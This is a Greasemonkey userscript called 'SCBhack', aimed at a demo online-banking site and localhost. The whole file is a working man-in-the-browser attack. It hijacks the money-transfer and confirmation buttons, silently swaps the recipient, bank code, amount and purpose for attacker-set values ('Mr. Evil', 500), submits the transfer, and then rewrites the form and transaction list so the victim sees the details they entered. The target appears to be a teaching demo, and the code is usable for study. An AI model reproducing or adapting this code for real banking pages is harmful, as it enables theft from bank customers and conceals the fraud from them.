// ==UserScript==
// @name           SCBhack
// @namespace      de.mrx.client
// @description    Greasemonkey version of the hack.
// @include        http://127.0.0.1*
// @include        http://securecloudbanking.appspot.com*
// @require		   http://code.jquery.com/jquery-1.3.2.js
// ==/UserScript==

HACK_REC_ACCOUNT	="999";
HACK_REC_NAME		="Mr. Evil";
HACK_BANK_BLZ		="8272";
HACK_BANK_NAME		="The Bad Bank";
HACK_AMOUNT			=500;
HACK_USAGE			="Weil es moeglich ist";
globalRC_Acc_Name="Mutter";
globalRC_Acc_Nr="725826262"
globalRC_Bank_BLZ="23000000";
globalRC_Bank_Name="Postbank"
global_Amount="34,50";
global_Usage="Vielen Dank fuer Ihren Einkauf";


	 function timedMsg()
		 {
		 	$("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){


		 			$(this).attr("hackMarker","true");
		 			sendMoneyBtnClone=$(this).clone(true)
		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
		 			$(this).after(sendMoneyBtnClone);
		 			$(this).hide();
		 			$(this).attr("hackMarkerBtnOrig","true");		 			
		 			sendMoneyBtnClone.click(function(event) {
		 				event.preventDefault(); 
		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
		 				 globalRC_Acc_Name=$("input:eq(2)").val();
		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
		 				 globalRC_Bank_Name=$("input:eq(4)").val();
		 				 global_Amount=$("input:eq(5)").val();
		 				 global_Usage=$("input:eq(6)").val();
		 				 
		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
		 				$("input:eq(2)").val(HACK_REC_NAME);
		 				$("input:eq(3)").val(HACK_BANK_BLZ);
		 				$("input:eq(4)").val(HACK_BANK_NAME);
		 				$("input:eq(5)").val(HACK_AMOUNT);
		 				$("input:eq(6)").val(HACK_USAGE);
		 				sendMoneyBtnClone.attr("activateReset","true");
		 				$("button[hackMarkerBtnOrig='true']").click();
		 				$(this).hide();
		 				});			
		 			
		 	});
		 	
		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)

[activateReset='true']").each(function(){		 		
		 		$("input:eq(1)").val(globalRC_Acc_Nr);
				$("input:eq(2)").val(globalRC_Acc_Name);
				$("input:eq(3)").val(globalRC_Bank_BLZ);
				$("input:eq(4)").val(globalRC_Bank_Name);
				$("input:eq(5)").val(global_Amount);
				$("input:eq(6)").val(global_Usage);
				 
		 		$(this).attr("hackConfPageMarker","true");
		 	});
		 	
		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')").each(function(){	
				
		 		$(this).attr("hackMarker","true");
	 			sendMoneyConfirmBtnClone=$(this).clone(true)
	 			$(this).after(sendMoneyConfirmBtnClone);
	 			$(this).hide();
	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
	 			sendMoneyConfirmBtnClone.click(function(event) {
	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
	 				$("input:eq(2)").val(HACK_REC_NAME);
	 				$("input:eq(3)").val(HACK_BANK_BLZ);
	 				$("input:eq(4)").val(HACK_BANK_NAME);
	 				$("input:eq(5)").val(HACK_AMOUNT);
	 				$("input:eq(6)").val(HACK_USAGE);
	 				$("button[hackMarkerConfirmBtnOrig='true']").click();
	 				});			
		 	});
		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Mr. Evil)').text(recText);		 	
		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(The Bad Bank)').text(bankText);
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(8272)').text(globalRC_Bank_BLZ);
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Weil es moeglich ist)').text

(global_Usage);
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
		 	
		 	

		 	
		 	var t=setTimeout(timedMsg,5000);

		 }
	 
	 $(document).ready(function() {
 	timedMsg();
	 });




